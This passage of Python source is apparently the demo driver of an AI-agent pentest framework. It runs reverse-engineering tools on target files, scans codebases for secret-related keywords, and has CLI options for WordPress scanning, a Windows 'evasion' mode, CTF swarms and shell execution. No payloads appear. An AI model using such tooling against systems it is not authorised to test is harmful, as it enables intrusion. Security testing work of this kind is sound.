        if r2_result.get("rc", -1) == 0:
            db.add_finding(target_file, "radare2", "info", "Radare2 analysis", r2_result.get("output", "")[:500])
            findings.append({"tool": "radare2", "output": r2_result.get("output", "")[:200]})

    elif skill == "ida-reverse":
        logger.info("Running ida-reverse skill: IDA (if available) and radare2...")
        # Try IDA first
        ida_result = gateway.run_tool("ida", {"target": target_file})
        if ida_result is None:
            ida_result = {}
        results["ida"] = ida_result
        if ida_result.get("rc", -1) == 0:
            db.add_finding(target_file, "ida", "info", "IDA Pro analysis", ida_result.get("output", "")[:500])
            findings.append({"tool": "ida", "output": ida_result.get("output", "")[:200]})
        else:
            logger.warning(f"IDA failed (or not installed): {ida_result.get('error', 'Unknown error')}")

        # Run radare2
        logger.info("Running radare2 analysis...")
        r2_result = gateway.run_tool("radare2", {"target": target_file, "commands": "aaa"})
        if r2_result is None:
            r2_result = {}
        results["radare2"] = r2_result
        if r2_result.get("rc", -1) == 0:
            db.add_finding(target_file, "radare2", "info", "Radare2 analysis", r2_result.get("output", "")[:500])
            findings.append({"tool": "radare2", "output": r2_result.get("output", "")[:200]})

        # Also run Ghidra if available
        logger.info("Running Ghidra analysis (if installed)...")
        ghidra_result = gateway.run_tool("ghidra_analyze", {"binary_path": target_file})
        if ghidra_result is None:
            ghidra_result = {}
        results["ghidra"] = ghidra_result
        if ghidra_result.get("rc", -1) == 0:
            db.add_finding(target_file, "ghidra", "info", "Ghidra analysis", ghidra_result.get("output", "")[:500])
            findings.append({"tool": "ghidra", "output": ghidra_result.get("output", "")[:200]})
        else:
            logger.warning(f"Ghidra failed or not installed: {ghidra_result.get('error', 'Unknown error')}")

    elif skill == "js-reverse":
        logger.info("Running js-reverse skill: deobfuscation and analysis...")
        js_result = gateway.run_tool("js_reverse", {"target": target_file})
        if js_result is None:
            js_result = {}
        results["js_reverse"] = js_result
        if js_result.get("rc", -1) == 0:
            db.add_finding(target_file, "js_reverse", "info", "JavaScript analysis", js_result.get("output", "")[:500])
            findings.append({"tool": "js_reverse", "output": js_result.get("output", "")[:200]})
        else:
            logger.warning(f"js_reverse failed: {js_result.get('error', 'Unknown error')}")

    elif skill == "firmware-pentest":
        logger.info("Running firmware-pentest skill: basic analysis with radare2 and strings...")
        # Run radare2
        r2_result = gateway.run_tool("radare2", {"target": target_file, "commands": "aaa"})
        if r2_result is None:
            r2_result = {}
        results["radare2"] = r2_result
        if r2_result.get("rc", -1) == 0:
            db.add_finding(target_file, "radare2", "info", "Radare2 firmware analysis", r2_result.get("output", "")[:500])
            findings.append({"tool": "radare2", "output": r2_result.get("output", "")[:200]})
        else:
            logger.warning(f"radare2 failed: {r2_result.get('error', 'Unknown error')}")

        # Also try strings
        try:
            import subprocess as sp
            strings_result = sp.run(["strings", target_file], capture_output=True, text=True, timeout=60)
            output = strings_result.stdout[:1000]
            results["strings"] = {"output": output, "rc": strings_result.returncode}
            db.add_finding(target_file, "strings", "info", "Strings extracted from firmware", output[:500])
            findings.append({"tool": "strings", "output": output[:200]})
        except Exception as e:
            logger.warning(f"strings failed: {e}")

    else:
        logger.error(f"Unknown skill: {skill}")
        db.finish_session(session_id, "failed")
        return {"error": f"Unknown skill: {skill}"}

    # Finalize session
    db.finish_session(session_id, "completed")

    # Compile report
    report = {
        "target_file": target_file,
        "skill": skill,
        "session_id": session_id,
        "timestamp": datetime.utcnow().isoformat(),
        "results": results,
        "findings_summary": findings
    }

    report_path = REPORTS_DIR / f"reverse_demo_{Path(target_file).stem}_{int(time.time())}.json"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2))
    logger.info(f"Reverse demo report saved to {report_path}")

    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.stop()
        logger.info("Defense monitoring stopped")

    return report


# ======================================================================
# RAPTOR DEMO (short looped reasoning against a local codebase)
# ======================================================================
def run_raptor_demo(
    config: dict,
    soul: Soul,
    skill_mgr: SkillManager,
    db: PhalanxDB,
    executor: ToolExecutor,
    gateway: Gateway,
    looped_harness: Optional[PhalanxLoopedHarness] = None,
    target_dir: str = ".",
    iterations: int = 3,
    defense_monitor: Optional[Any] = None
) -> dict:
    """
    Run a short Raptor loop against a local codebase for verification.
    Uses the looped transformer harness to refine analysis on source files.
    """
    if config is None:
        config = {}

    logger.info("Starting RAPTOR demo (looped reasoning against codebase)")
    target_path = Path(target_dir).expanduser().resolve()
    if not target_path.exists():
        return {"error": f"Target directory not found: {target_path}"}

    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.start()
        logger.info("Defense monitoring started")

    # Gather source files
    extensions = [".py", ".c", ".cpp", ".cc", ".h", ".js", ".go", ".rs", ".java", ".rb", ".sh"]
    files = []
    for ext in extensions:
        files.extend(target_path.rglob(f"*{ext}"))
    logger.info(f"Found {len(files)} source files in {target_path}")

    # Limit to a small sample for speed
    sample_files = files[:10]  # at most 10 files
    logger.info(f"Processing {len(sample_files)} files in Raptor loop")

    results = {}
    # If looped_harness is None, we cannot run looped reasoning; fallback to normal analysis
    if looped_harness is None or not hasattr(looped_harness, 'refine_once'):
        logger.warning("Looped harness not available – running static analysis only")
        for file in sample_files:
            try:
                content = file.read_text(errors='ignore')[:500]
                # Simple analysis: count lines, detect keywords
                keywords = ["password", "api_key", "secret", "token", "admin"]
                found = [kw for kw in keywords if kw in content.lower()]
                results[file.name] = {
                    "size": file.stat().st_size,
                    "lines": len(content.splitlines()),
                    "suspicious_keywords": found
                }
            except Exception as e:
                logger.warning(f"Could not read {file}: {e}")
        # Generate a simple report
        report = {
            "mode": "static_analysis",
            "target_dir": str(target_path),
            "files_analyzed": len(sample_files),
            "results": results,
            "timestamp": datetime.utcnow().isoformat()
        }
    else:
        # Run looped reasoning
        logger.info("Running looped reasoning on each file...")
        looped_harness.start(str(target_path))  # start background harness
        try:
            for i, file in enumerate(sample_files):
                try:
                    content = file.read_text(errors='ignore')[:1000]
                    # Create a command for refinement
                    command = f"source_analysis {file.name}"
                    # Store context in soul memory
                    soul.append_memory("RAPTOR_INPUT", file.name, content)
                    # Run refinement
                    looped_harness.refine_once(str(target_path), command)
                    time.sleep(0.5)  # small delay
                except Exception as e:
                    logger.warning(f"Looped refinement failed for {file}: {e}")
                if i >= iterations - 1:  # only run for specified iterations
                    break
        finally:
            looped_harness.stop()

        # Collect results from soul memory
        memories = soul.recent_memory(20)
        refinements = [m for m in memories if m['type'].startswith("LOOP_REFINE/")]
        report = {
            "mode": "looped",
            "target_dir": str(target_path),
            "iterations": iterations,
            "files_processed": len(sample_files),
            "refinements_count": len(refinements),
            "refinements": refinements[:10],
            "timestamp": datetime.utcnow().isoformat()
        }

    report_path = REPORTS_DIR / f"raptor_demo_{int(time.time())}.json"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2))
    logger.info(f"Raptor demo report saved to {report_path}")

    if defense_monitor is not None and DEFENSE_AVAILABLE:
        defense_monitor.stop()
        logger.info("Defense monitoring stopped")

    return report


# ======================================================================

# ------------------------------------------------------------------
# CLI entry point
# ------------------------------------------------------------------
if __name__ == "__main__":
    import argparse
    from phalanx_library import bootstrap_all

    parser = argparse.ArgumentParser(description="PHALANX Demo")
    parser.add_argument("--swarm", action="store_true", help="Use swarm mode (CTF)")
    parser.add_argument("--graph", "--shadow", action="store_true", help="Enable Shadow Graph persistence in swarm demo")
    parser.add_argument("--loop", action="store_true", help="Enable Looped Transformer harness (background reasoning)")
    parser.add_argument("--defense", action="store_true", help="Enable defense monitoring during demo")
    parser.add_argument("--wp-target", help="Additional WordPress target to scan (e.g., http://example.com)")
    parser.add_argument("--winstealth", action="store_true", help="Use WinStealth for Windows targets (low-level evasion)")
    parser.add_argument("--reverse-demo", action="store_true", help="Run reverse engineering demo on a target file")
    parser.add_argument("--target-file", help="Target file for reverse demo (e.g., sample.apk)")
    # Raptor demo
    parser.add_argument("--raptor-demo", action="store_true", help="Run a short Raptor loop against a local codebase")
    parser.add_argument("--raptor-target", default=".", help="Target directory for Raptor demo (default: current directory)")
    parser.add_argument("--raptor-iterations", type=int, default=3, help="Number of refinement iterations (default: 3)")
    # Shell demo (NEW)
    parser.add_argument("--shell-demo", action="store_true", help="Test the shell tool by running a few safe commands")
    parser.add_argument("--no-raptor", action="store_true", help="Disable Raptor loop in swarm demo (enabled by default)")
    parser.add_argument("--config", default="config.json", help="Config file path")
    args = parser.parse_args()

    config_path = Path(args.config)
    if config_path.exists():
        config = json.loads(config_path.read_text())
    else:
        logger.warning(f"Config file {args.config} not found. Using defaults.")
        config = {
            "demo_target": "metasploitable2",
            "sandbox": {"enabled": False},
            "ollama": {"url": "http://localhost:11434", "default_model": "qwen2.5:7b"},
            "swarm": {"default_model": "qwen2.5:0.5b"},
            "looped": {"enabled": True},
            "embed": {"enabled": True, "model": "all-MiniLM-L6-v2"}
        }

    # Enable WinStealth if flag is set
    if args.winstealth:
        config.setdefault("winstealth", {})["enabled"] = True
        logger.info("WinStealth enabled via --winstealth flag")

    # Enable shell if shell-demo is requested (we can set allow_shell in config)
    if args.shell_demo:
        config["allow_shell"] = True
        os.environ["PHALANX_ALLOW_SHELL"] = "1"  # also set env for safety
        logger.info("Shell execution enabled for demo")

    try:
        soul, skill_mgr, db, _, looped_harness = bootstrap_all(config)
    except Exception as e:
        logger.error(f"Failed to bootstrap PHALANX components: {e}")
        logger.error("Make sure all dependencies are installed and configuration is valid.")
        sys.exit(1)

    gateway = Gateway(config, TOOL_REGISTRY)
    executor = ToolExecutor(timeout=30, soul=soul, config=config)

    # Initialize defense_monitor variable
    defense_monitor = None
    if args.defense and DEFENSE_AVAILABLE:
        defense_monitor = NetWatchMonitor(gateway=gateway, soul=soul, db=db, config=config)
        logger.info("Defense monitor initialized")
    elif args.defense and not DEFENSE_AVAILABLE:
        logger.warning("Defense mode requested but phalanx_defense module not available – skipping")

    # ------------------------------------------------------------------
    # Route to appropriate demo
    # ------------------------------------------------------------------
    try:
        if args.reverse_demo:
            if not args.target_file:
                logger.error("--reverse-demo requires --target-file")
                sys.exit(1)
            report = run_reverse_demo(
                config, soul, skill_mgr, db, executor, gateway,
                target_file=args.target_file,
                defense_monitor=defense_monitor
            )
        elif args.raptor_demo:
            report = run_raptor_demo(
                config, soul, skill_mgr, db, executor, gateway,
                looped_harness=looped_harness,
                target_dir=args.raptor_target,
                iterations=args.raptor_iterations,
                defense_monitor=defense_monitor
            )
        elif args.shell_demo:
            report = run_shell_demo(
                config, soul, skill_mgr, db, executor, gateway,
                defense_monitor=defense_monitor
            )
        elif args.swarm:
            # Determine if we should use Raptor
            use_raptor = not args.no_raptor  # default True unless --no-raptor
            report = run_swarm_demo(
                config, soul, skill_mgr, db, executor, gateway,
                enable_shadow_graph=args.graph,
                enable_looped=args.loop,
                looped_harness=looped_harness,
                wp_target=args.wp_target,
                defense_monitor=defense_monitor,
                use_raptor=use_raptor
            )
        else:
            report = run_demo(config, soul, skill_mgr, db, executor, gateway,
                              wp_target=args.wp_target,
                              defense_monitor=defense_monitor)

        print(json.dumps(report, indent=2))
    except Exception as e:
        logger.error(f"Demo failed: {e}")
        sys.exit(1)
    finally:
        db.close()
        if defense_monitor and DEFENSE_AVAILABLE:
            defense_monitor.stop()